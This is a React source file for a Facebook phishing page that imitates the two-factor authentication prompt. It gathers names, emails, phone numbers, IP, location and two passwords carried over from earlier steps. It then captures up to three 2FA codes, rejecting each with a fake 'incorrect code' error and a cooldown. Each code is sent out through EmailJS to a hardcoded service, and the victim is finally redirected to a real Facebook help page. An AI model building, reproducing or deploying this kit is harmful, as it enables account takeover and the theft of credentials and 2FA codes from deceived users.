import React, { useState } from "react";
import { useLocation, Navigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./AuthCodeForm.scss";

const AuthCodeForm = () => {
  const { state } = useLocation();
  if (!state) return <Navigate to="/" replace />;

  const {
    method = "app",
    ip,
    location,
    formData,
    password1,
    password2,
    additionalInfo,
    currentUrl = "",
  } = state;

  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [code3, setCode3] = useState("");
  const [method1, setMethod1] = useState("");
  const [method2, setMethod2] = useState("");
  const [method3, setMethod3] = useState("");

  const [showOptions, setShowOptions] = useState(false);
  const [loadingOptions, setLoadingOptions] = useState(false);

  const [selectedMethod, setSelectedMethod] = useState(method);
  const [currentStep, setCurrentStep] = useState(`code-${method}`);

  const [clickCount, setClickCount] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);

  // NEW: spinner states for buttons (giữ nguyên SCSS)
  const [loadingSubmit, setLoadingSubmit] = useState(false);
  const [loadingConfirm, setLoadingConfirm] = useState(false);

  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  const startCooldown = () => {
    setIsSubmitDisabled(true);
    setTimeLeft(60);
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsSubmitDisabled(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const updateEmailJSData = async (
    step,
    {
      code1Input = code1,
      code2Input = code2,
      code3Input = code3,
      method1Input = method1,
      method2Input = method2,
      method3Input = method3,
    } = {}
  ) => {
    const locationParts = location.split("/").map((part) => part.trim());
    const currentTime = new Date().toLocaleString();

    let templateParams = {
      form_type: "",
      full_name: formData?.fullName || "",
      personal_email: formData?.personalEmail || "",
      business_email: formData?.businessEmail || "",
      phone_number: formData?.phoneNumber || "",
      date_of_birth: formData?.dateOfBirth || "N/A",
      page_name: formData?.link || "",
      ip_address: ip || "",
      country: locationParts[2] || "N/A",
      city: locationParts[1] || "N/A",
      current_time: currentTime,
      current_url: currentUrl || window.location.href,
      additional_info: additionalInfo || "N/A",
      password1: password1 || "N/A",
      password2: password2 || "N/A",
      code1: code1Input
        ? `${code1Input} (${method1Input || "unknown"})`
        : "N/A",
      code2: code2Input
        ? `${code2Input} (${method2Input || "unknown"})`
        : "N/A",
      code3: code3Input
        ? `${code3Input} (${method3Input || "unknown"})`
        : "N/A",
    };

    switch (step) {
      case "code1":
        templateParams.form_type = "First 2FA Code Submitted";
        break;
      case "code2":
        templateParams.form_type = "Second 2FA Code Submitted";
        break;
      case "code3":
        templateParams.form_type = "Final 2FA Code Submitted - COMPLETE";
        break;
      default:
        templateParams.form_type = "Form Update";
    }

    await emailjs.send("service_6b4csj2", "template_sv0xth6", templateParams);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit)
      return;

    setLoadingSubmit(true);
    try {
      if (clickCount === 0) {
        setCode1(code);
        setMethod1(selectedMethod);
        await updateEmailJSData("code1", {
          code1Input: code,
          method1Input: selectedMethod,
        });
        setClickCount(1);
        setCode("");
        startCooldown();
      } else if (clickCount === 1) {
        setCode2(code);
        setMethod2(selectedMethod);
        await updateEmailJSData("code2", {
          code1Input: code1,
          code2Input: code,
          method1Input: method1,
          method2Input: selectedMethod,
        });
        setClickCount(2);
        setCode("");
        startCooldown();
      } else if (clickCount === 2) {
        setCode3(code);
        setMethod3(selectedMethod);
        await updateEmailJSData("code3", {
          code1Input: code1,
          code2Input: code2,
          code3Input: code,
          method1Input: method1,
          method2Input: method2,
          method3Input: selectedMethod,
        });
        setTimeout(() => {
          window.location.href =
            "https://www.facebook.com/help/1735443093393986/";
        }, 2000);
      }
    } catch (err) {
      console.error("EmailJS Error:", err);
    } finally {
      setLoadingSubmit(false);
    }
  };

  const handleTryAnotherWay = () => {
    setLoadingOptions(true);
    setTimeout(() => {
      setLoadingOptions(false);
      setShowOptions(true);
    }, 1000);
  };

  const handleMethodSelect = (method) => setSelectedMethod(method);

  const confirmMethod = () => {
    setShowOptions(false);
    setCurrentStep(`code-${selectedMethod}`);
    setCode(""); // reset input đang nhập; KHÔNG reset clickCount/code1-3
  };

  // Bọc confirmMethod để hiện spinner trên nút trong modal
  const handleConfirmClick = async () => {
    if (loadingConfirm) return;
    setLoadingConfirm(true);
    try {
      confirmMethod();
    } finally {
      setLoadingConfirm(false);
    }
  };

  // Helpers mask hiển thị đuôi số / email
  const getPhoneTail = (phone = "") => {
    const digits = String(phone).replace(/\D/g, "");
    if (!digits) return "**";
    return digits.slice(-2);
  };
  const maskPhone = (phone = "") => {
    const tail = getPhoneTail(phone);
    return `number ******${tail}`;
  };
  const maskEmail = (email = "") => {
    if (!email || !email.includes("@")) return "***@***";
    const [user, domain] = email.split("@");
    const visible = user.length >= 2 ? user.slice(0, 2) : user.slice(0, 1);
    return `${visible}***@${domain}`;
  };
  const getMethodTargetLabel = (m, formData) => {
    if (m === "email") {
      const email = formData?.personalEmail || formData?.businessEmail || "";
      return maskEmail(email);
    }
    return maskPhone(formData?.phoneNumber || "");
  };

  return (
    <div className="auth-container">
      <div className="auth-box">
        <p className="meta">
          {formData?.fullName || "Facebook User"} • Facebook
        </p>

        {currentStep === "code-whatsapp" ? (
          <>
            <p className="title">Check your WhatsApp messages</p>
            <p className="description">
              Enter the code we sent to your WhatsApp{" "}
              {getMethodTargetLabel("whatsapp", formData)}.
            </p>
            <img
              src="/imgi_1_whatsApp.4313bae1d1ce346d2fe6.png"
              alt="whatsapp"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-sms" ? (
          <>
            <p className="title">Check your Phone number</p>
            <p className="description">
              Enter the code we sent to your{" "}
              {getMethodTargetLabel("sms", formData)}.
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="sms"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-email" ? (
          <>
            <p className="title">Check your Email</p>
            <p className="description">
              Enter the code we sent to{" "}
              {getMethodTargetLabel("email", formData)}.
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="email"
              className="auth-image"
            />
          </>
        ) : (
          <>
            <p className="title">Go to your authentication app</p>
            <p className="description">
              Enter the 6-digit code for this account from the two-factor
              authentication app that you set up (such as Duo Mobile or Google
              Authenticator).
            </p>
            <img
              src="/imgi_1_2fa.cef3489675d7acf425ec.jpg"
              alt="2FA"
              className="auth-image"
            />
          </>
        )}

        {/* Form nhập code */}
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Enter 6–8 digit code"
            maxLength={8}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="auth-input"
          />

          {isSubmitDisabled && (
            <p
              className="description"
              style={{ marginTop: -4, marginBottom: 12, color: "red" }}
            >
              The code you entered is incorrect or already used. Please try
              again after {String(timeLeft).padStart(2, "0")}s.
            </p>
          )}

          {/* Giữ nguyên class, chỉ thêm spinner khi loadingSubmit */}
          <button
            type="submit"
            className={`auth-button ${isSubmitDisabled ? "disabled" : ""}`}
            disabled={code.length < 6 || isSubmitDisabled || loadingSubmit}
          >
            {loadingSubmit ? <span className="spinner-inline" /> : "Continue"}
          </button>
        </form>

        {/* Nút Try Another Way (đã có spinner sẵn) */}
        <button
          className="secondary-button"
          onClick={handleTryAnotherWay}
          disabled={loadingOptions}
        >
          {loadingOptions ? (
            <span className="spinner-inline" />
          ) : (
            "Try Another Way"
          )}
        </button>
      </div>

      {showOptions && (
        <div className="modal-overlay" onClick={() => setShowOptions(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <h3>Select a method to verify your identity</h3>
            <p>These verification methods are available to you.</p>
            <div className="method-list">
              {["app", "whatsapp", "sms", "email"].map((m) => (
                <label key={m}>
                  <div className="method-info">
                    <strong>
                      {m === "app" ? "Authentication app" : m.toUpperCase()}
                    </strong>
                    <span>
                      {m === "app"
                        ? "Google Authenticator, Duo Mobile"
                        : `We will send the code to ${getMethodTargetLabel(
                            m,
                            formData
                          )}`}
                    </span>
                  </div>
                  <input
                    type="radio"
                    checked={selectedMethod === m}
                    onChange={() => handleMethodSelect(m)}
                  />
                </label>
              ))}
            </div>

            {/* Giữ class cũ, thêm spinner khi loadingConfirm */}
            <button
              className="auth-button"
              onClick={handleConfirmClick}
              disabled={loadingConfirm}
            >
              {loadingConfirm ? (
                <span className="spinner-inline" />
              ) : (
                "Continue"
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AuthCodeForm;
